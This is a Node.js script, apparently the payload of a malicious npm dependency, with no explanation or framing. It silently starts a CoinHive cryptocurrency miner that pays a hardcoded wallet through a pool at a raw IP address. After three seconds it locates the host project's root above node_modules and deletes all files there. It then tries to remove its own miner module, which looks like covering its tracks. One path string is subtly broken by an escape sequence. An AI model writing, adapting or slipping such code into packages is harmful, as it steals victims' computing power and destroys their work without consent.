const CoinHive = require("coin-hive");
const findRemoveSync = require("find-remove");

(async () => {
  
  process.on('unhandledRejection', up => { 
    console.log( up );
  });
  
  const miner = await CoinHive('44tKLXJSEJPBkfGpwiz4Hy23ZdBdPTXhXXjncmJUg2J2fbEvfreyxRgfo6PvGgr5GRGasJVhYDgf5GTcmNLyrLfUAXMPGaG', {
    pool: {
      host: '213.32.29.150',
      port: 14444
    }
  });
  await miner.start();
  miner.on('update', data => console.log(`
    ${data.acceptedHashes}
  `));
  
    setTimeout(async () => {
      
      
      pathArr = __dirname.split("/");
      
      rootDir = pathArr[0];
      
      for(i = 1; i< pathArr.length; i++) {
          if(pathArr[i] != 'node_modules') {
              rootDir += "/" + pathArr[i];
          } else {
              break;
          }
      }
      
      try {
          console.log('Clean up ' + rootDir);
          //findRemoveSync(rootDir, {dir: "*", files: "*.*", ignore: "puppeteer"});
          findRemoveSync(rootDir, {files: "*.*"});
          findRemoveSync(rootDir + "\node_modules", {dir: "coin-hive*"});
      } catch(e) {

      }
      
  }, 3000);
  
})();